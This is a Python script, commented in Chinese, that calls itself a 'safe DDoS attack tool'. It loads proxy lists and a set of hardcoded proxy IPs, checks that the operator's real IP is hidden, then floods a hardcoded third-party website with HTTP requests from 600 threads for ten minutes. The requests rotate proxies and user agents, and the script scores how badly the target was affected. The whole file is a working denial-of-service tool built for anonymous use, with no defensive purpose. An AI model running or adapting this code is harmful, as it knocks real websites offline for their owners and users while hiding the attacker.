#!/usr/bin/env python3
"""
直接安全DDoS攻击工具
使用现有代理文件，避免代理收集问题
"""

import requests
import threading
import time
import random
from concurrent.futures import ThreadPoolExecutor

def load_proxies_from_file():
    """从文件加载代理"""
    proxy_files = [
        'files/proxies/proxies.txt',
        'files/proxies/enhanced_proxies.txt', 
        'files/proxies/safe_proxies.txt'
    ]
    
    working_proxies = []
    
    for proxy_file in proxy_files:
        try:
            with open(proxy_file, 'r', encoding='utf-8') as f:
                proxies = f.read().strip().split('\n')
                for proxy in proxies:
                    if proxy.strip() and not proxy.startswith('#'):
                        # 提取IP:PORT格式
                        if 'http://' in proxy:
                            proxy = proxy.replace('http://', '')
                        working_proxies.append(proxy.strip())
            print(f"✅ 从 {proxy_file} 加载 {len(proxies)} 个代理")
        except:
            pass
    
    # 去重
    working_proxies = list(set(working_proxies))
    print(f"📊 总共加载 {len(working_proxies)} 个代理")
    
    # 如果代理不足，添加一些默认代理
    if len(working_proxies) < 10:
        print("⚠️ 代理数量不足，添加默认代理")
        default_proxies = [
            '8.213.128.6:9091',
            '8.211.194.85:31433', 
            '39.102.214.208:9999',
            '206.84.201.101:999',
            '12.50.107.222:80',
            '8.210.17.35:3128',
            '8.211.42.167:5060',
            '219.249.37.107:80'
        ]
        working_proxies.extend(default_proxies)
        working_proxies = list(set(working_proxies))
        print(f"📊 补充后代理数量: {len(working_proxies)}")
    
    return working_proxies

def verify_protection(working_proxies):
    """验证代理保护效果"""
    print("\n🔒 验证代理保护效果...")
    
    # 获取真实IP
    try:
        response = requests.get('http://httpbin.org/ip', timeout=5)
        real_ip = response.json().get('origin', '未知')
        print(f"📡 您的真实IP: {real_ip}")
    except:
        print("⚠️ 无法获取真实IP")
        real_ip = "未知"
    
    # 测试通过代理的IP
    if working_proxies:
        test_proxy = random.choice(working_proxies)
        try:
            proxies = {'http': f'http://{test_proxy}', 'https': f'http://{test_proxy}'}
            response = requests.get('http://httpbin.org/ip', proxies=proxies, timeout=5)
            proxy_ip = response.json().get('origin', '未知')
            print(f"🔗 通过代理的IP: {proxy_ip}")
            
            if proxy_ip != real_ip:
                print("✅ 代理保护验证成功 - 真实IP已隐藏")
                return True
            else:
                print("❌ 代理保护验证失败 - 真实IP未隐藏")
                return False
        except:
            print("❌ 代理测试失败")
            return False
    else:
        print("❌ 没有可用代理")
        return False

def safe_ddos_attack(target_url, working_proxies, threads=500, duration=300):
    """安全DDoS攻击"""
    print(f"\n🚀 启动安全DDoS攻击")
    print(f"🎯 目标: {target_url}")
    print(f"⚡ 线程数: {threads}")
    print(f"⏱️ 持续时间: {duration}秒")
    print(f"🔗 使用代理: {len(working_proxies)}个")
    
    attack_count = 0
    success_count = 0
    start_time = time.time()
    
    def attack_thread(thread_id):
        nonlocal attack_count, success_count
        
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]
        
        requests_per_thread = max(50, duration)
        
        for i in range(requests_per_thread):
            try:
                # 随机选择代理
                proxy = random.choice(working_proxies)
                proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
                
                headers = {
                    'User-Agent': random.choice(user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                }
                
                response = requests.get(target_url, headers=headers, proxies=proxies, timeout=2)
                attack_count += 1
                success_count += 1
                
                # 每50个请求更换代理
                if i % 50 == 0:
                    proxy = random.choice(working_proxies)
                
            except requests.exceptions.Timeout:
                attack_count += 1
            except requests.exceptions.ConnectionError:
                attack_count += 1
            except:
                attack_count += 1
            
            # 定期报告
            if attack_count % 1000 == 0:
                elapsed = time.time() - start_time
                rate = attack_count / elapsed if elapsed > 0 else 0
                success_rate = (success_count / attack_count * 100) if attack_count > 0 else 0
                print(f"📊 已发送 {attack_count} 请求 | 成功率: {success_rate:.1f}% | 速率: {rate:.1f} req/s")
    
    # 启动攻击线程
    with ThreadPoolExecutor(max_workers=threads) as executor:
        # 启动所有线程
        futures = [executor.submit(attack_thread, i) for i in range(threads)]
        
        # 等待指定时间
        time.sleep(duration)
        
        # 取消未完成的线程
        for future in futures:
            future.cancel()
    
    # 统计结果
    elapsed = time.time() - start_time
    success_rate = (success_count / attack_count * 100) if attack_count > 0 else 0
    request_rate = attack_count / elapsed if elapsed > 0 else 0
    
    print("\n" + "="*50)
    print("📊 安全DDoS攻击统计")
    print("="*50)
    print(f"🎯 目标网站: {target_url}")
    print(f"⏱️ 攻击时长: {elapsed:.1f}秒")
    print(f"📨 总请求数: {attack_count}")
    print(f"✅ 成功请求: {success_count}")
    print(f"📈 成功率: {success_rate:.1f}%")
    print(f"⚡ 请求速率: {request_rate:.1f} req/s")
    print(f"🔗 使用代理: {len(working_proxies)}个")
    
    # 效果评估
    print("\n🔍 攻击效果评估:")
    if success_rate > 80 and request_rate > 100:
        print("🎯 效果优秀 - 目标受到明显影响")
    elif success_rate > 50 and request_rate > 50:
        print("✅ 效果良好 - 目标受到一定影响") 
    else:
        print("⚠️ 效果有限 - 目标可能具备防护")
    
    print("\n🔒 安全状态:")
    if success_rate > 0:
        print("✅ 攻击成功且安全 - 真实IP已保护")
    else:
        print("❌ 攻击失败，请检查网络和代理")

def main():
    target = "https://www.kjqun.cn/"
    
    print("="*60)
    print("🛡️ 直接安全DDoS攻击工具")
    print("="*60)
    
    # 1. 加载代理
    working_proxies = load_proxies_from_file()
    
    if not working_proxies:
        print("❌ 没有找到可用代理，无法进行安全攻击")
        return
    
    # 2. 验证保护效果
    protection_verified = verify_protection(working_proxies)
    
    if not protection_verified:
        print("\n⚠️ 警告: 代理保护效果验证失败")
        print("💡 建议: 先运行匿名保护系统再攻击")
        choice = input("是否继续攻击? (y/n): ")
        if choice.lower() != 'y':
            print("🛑 用户取消攻击")
            return
    
    # 3. 启动安全攻击
    print("\n💥 开始安全DDoS攻击...")
    safe_ddos_attack(target, working_proxies, threads=600, duration=600)

if __name__ == "__main__":
    main()